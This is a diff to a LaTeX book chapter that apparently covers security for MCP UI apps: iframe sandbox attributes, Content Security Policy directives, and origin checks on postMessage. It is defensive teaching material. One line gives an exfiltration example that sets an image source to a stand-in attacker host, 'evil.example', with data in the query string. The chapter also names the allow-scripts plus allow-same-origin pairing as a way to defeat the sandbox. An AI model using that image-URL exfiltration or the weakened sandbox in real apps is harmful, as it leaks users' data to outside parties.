@@ -120,9 +120,84 @@ The iframe cannot reach the parent DOM, cannot read the host's cookies or local
 storage, cannot navigate the parent page, and cannot execute in the parent
 context. Standard browser sandboxing, doing what it was designed for.
 
-Network access is denied by default and granted only to origins the server
-declared in \texttt{\_meta.ui.csp}. An app that wants to load a charting library
-from a CDN must say so in advance, in a field a human can read during review.
+Two mechanisms produce that, and they are worth separating because they fail
+independently.
+
+\textbf{The \texttt{sandbox} attribute} on the iframe. By default it removes
+almost everything: scripts, forms, popups, top-level navigation, and, crucially,
+the frame's origin. A sandboxed frame gets a unique opaque origin, which is what
+makes it a stranger to the parent page rather than a colleague.
+
+An app needs JavaScript, so the host adds \texttt{allow-scripts} back. What it
+must never add alongside it is \texttt{allow-same-origin}:
+
+\begin{plain}
+sandbox="allow-scripts"                      the app runs, isolated
+sandbox="allow-scripts allow-same-origin"    the sandbox is now decorative
+\end{plain}
+
+Those two together give the frame back the parent's origin \emph{and} the
+ability to run code in it, which is precisely the combination the sandbox
+existed to prevent. The frame can then reach into the parent document, read
+storage, and remove its own sandbox attribute for good measure. The browser
+warns about this pairing in the console and permits it anyway, and it is the
+single most common way a sandbox turns out to have been decoration.
+
+\textbf{A Content Security Policy}, which controls what the frame may talk to.
+
+\subsection{CSP, for people who have not written one}
+
+A Content Security Policy is a list of directives, each naming a class of
+resource and the origins that class may come from. The browser enforces it,
+which is what makes it worth anything: an app cannot opt out of a policy applied
+to it.
+
+The directives that matter here:
+
+\begin{table}[htbp]
+\centering
+\small
+\begin{tabularx}{\textwidth}{@{}lX@{}}
+\toprule
+\thead{Directive} & \thead{Governs} \\
+\midrule
+\texttt{connect-src} & \texttt{fetch}, XHR, WebSocket, \texttt{sendBeacon}. The exfiltration directive \\
+\texttt{script-src}  & Where executable code may be loaded from \\
+\texttt{style-src}   & Stylesheets \\
+\texttt{img-src}     & Images, which are a data channel too: a URL is a GET \\
+\texttt{frame-src}   & Nested frames \\
+\texttt{default-src} & The fallback for anything not named above \\
+\bottomrule
+\end{tabularx}
+\caption{A deny-by-default policy sets \texttt{default-src 'none'} and then adds
+back only what the app demonstrably needs.}
+\label{tab:csp-directives}
+\end{table}
+
+The host builds the policy, starting from deny-everything and adding the origins
+the server declared in \texttt{\_meta.ui.csp}. So an app that wants a charting
+library from a CDN must say so in advance, in a field a human reads during
+review, rather than discovering the need at runtime and reaching for it.
+
+\begin{wire}
+"_meta": {
+  "ui": {
+    "resourceUri": "ui://meridian/risk-dashboard",
+    "csp": { "connect-src": ["https://api.meridian.example"] }
+  }
+}
+\end{wire}
+
+Note which directive the exfiltration lives behind. An app that renders account
+data and declares \texttt{connect-src} to an origin you do not recognise has
+asked you, in writing, for permission to send that data somewhere. And
+\texttt{img-src} is the one people forget: setting an image source to
+\texttt{https://evil.example/?d=<data>} is a GET request with a payload, and no
+\texttt{connect-src} entry is involved.
+
+Meridian's template needs none of this. It has no external assets, so its policy
+is deny-everything, and its only channel to the world is the one described
+below.
 
 \subsection{The rule that everything else rests on}
 
@@ -289,6 +364,42 @@ which is the Apps extension's own revision, not core MCP's. Extensions
 version independently, as Chapter~\ref{ch:tasks} described, and this is what
 that looks like in practice.
 
+\subsection{What \texttt{postMessage} is, and where the check goes}
+
+\texttt{postMessage} exists because the same-origin policy forbids two documents
+from different origins touching each other's DOM, and yet they sometimes need to
+talk. It is the one sanctioned hole: a document may send a structured-cloneable
+value to another window, which receives it as an event.
+
+It has two parameters that carry all the security, one on each side.
+
+\textbf{Sending: \texttt{targetOrigin}.} The second argument to
+\texttt{postMessage}. The browser delivers the message only if the receiving
+document's origin matches, so passing your host's actual origin means a frame
+that has been navigated somewhere unexpected receives nothing. Passing
+\texttt{'*'} means deliver to whoever is there.
+
+\textbf{Receiving: \texttt{event.origin}.} The property on the inbound event,
+set by the browser and not by the sender, which is what makes it trustworthy.
+Nothing checks it for you.
+
+\begin{plain}
+window.addEventListener('message', (e) => {
+  if (e.origin !== EXPECTED_ORIGIN) return;   // the whole check
+  handle(e.data);
+});
+\end{plain}
+
+Omit those two lines in a host and any page that can get a handle on your window
+can send you JSON-RPC. The bridge is the app's only channel to the outside, so
+whatever can write to the bridge has the app's whole authority, and the app's
+authority includes calling tools.
+
+The asymmetry is worth stating plainly, because it decides where to spend your
+care. An app that gets \texttt{targetOrigin} wrong leaks its own messages. A
+host that skips \texttt{event.origin} accepts commands from anybody. The
+receiving side is where the security is.
+
 \begin{notebox}{On \texttt{targetOrigin: '*'}}
 Meridian passes \texttt{'*'} because the host's origin is not known to a
 template that may be rendered by any host.
@@ -368,12 +479,15 @@ any other.
 at \texttt{ui://} resources.
 \item Predeclaration lets the host prefetch, cache, and \emph{review} before any
 tool runs. Review is the real benefit.
-\item Sandboxed iframe. No parent DOM, no cookies, no network unless the server
-declared origins.
+\item Sandboxed iframe. \texttt{allow-scripts} without
+\texttt{allow-same-origin}, or the sandbox is decoration. Deny-by-default CSP,
+and \texttt{connect-src} is the exfiltration directive.
 \item Every UI-initiated tool call goes through the host's normal consent and
 audit path. This rule is what makes the rest safe.
-\item \texttt{structuredContent} feeds the app, \texttt{content} feeds the
-model, and that split is how an app saves context.
+\item Validate \texttt{event.origin} on every inbound \texttt{postMessage}. The
+receiving side is where the security is. \item \texttt{structuredContent} feeds
+the app, \texttt{content} feeds the model, and that split is how an app saves
+context.
 \item Build an app when the next three questions are clicks. Otherwise return
 text.
 \item Always degrade gracefully. Not every host renders apps, and your text
